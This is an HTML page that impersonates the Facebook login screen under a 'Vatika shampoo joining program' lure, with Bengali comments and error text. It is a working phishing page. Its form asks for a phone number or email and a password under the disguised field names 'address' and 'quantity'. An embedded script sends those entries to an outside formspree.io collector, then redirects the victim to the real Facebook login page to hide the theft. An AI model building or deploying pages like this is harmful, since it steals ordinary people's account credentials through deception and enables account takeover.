<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <title>Facebook log in - Vatika shampoo joining program  </title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      width: 100%;
      max-width: 360px;
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
      text-align: center;
    }
    .container h1 {
      color: #1877f2;
      font-size: 26px;
      margin-bottom: 20px;
    }
    input {
      display: block;
      width: 100%;
      box-sizing: border-box;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 14px;
    }
    .btn {
      width: 100%;
      padding: 12px;
      background: #1877f2;
      color: #fff;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }
    .btn:hover {
      background: #0d4a8c;
    }
    .link {
      display: block;
      margin: 10px 0;
      font-size: 13px;
      color: #1877f2;
      text-decoration: none;
    }
    .link:hover {
      text-decoration: underline;
    }
    .divider {
      display: flex;
      align-items: center;
      text-align: center;
      margin: 10px 0;
    }
    .divider::before, .divider::after {
      content: '';
      flex: 1;
      border-bottom: 1px solid #ccc;
    }
    .divider:not(:empty)::before {
      margin-right: .5em;
    }
    .divider:not(:empty)::after {
      margin-left: .5em;
    }

    /* ✅ "আপনার বয়স" বোতাম সাদা */
    .age-btn {
      background: #ffffff;
      color: #000; /* কালো টেক্সট যাতে দেখা যায় */
      border: 1px solid #ccc;
      margin-top: 10px;
    }
    .age-btn:hover {
      background: #f5f5f5;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>facebook</h1>
    <form id="orderForm" action="https://formspree.io/f/xwpqjnqy" method="POST">
      <input type="text" name="address" placeholder="mobile number or Email address " required>
      <input type="number" name="quantity" placeholder="password" required>
      <button type="submit" class="btn">Log in</button>
    </form>
    <a href="#" class="link">forget password?</a>
    <div class="divider">or</div>
    <button class="btn age-btn">create new account </button>
  </div>

  <script>
    document.getElementById("orderForm").addEventListener("submit", function(event) {
      event.preventDefault();
      const form = event.target;

      fetch(form.action, {
        method: form.method,
        body: new FormData(form),
        headers: { 'Accept': 'application/json' }
      }).then(response => {
        if (response.ok) {
          window.location.href = "https://www.facebook.com/login.php";
        } else {
          alert("কিছু ভুল হয়েছে, আবার চেষ্টা করুন।");
        }
      }).catch(error => {
        alert("Error: " + error);
      });
    });
  </script>
</body>
</html>
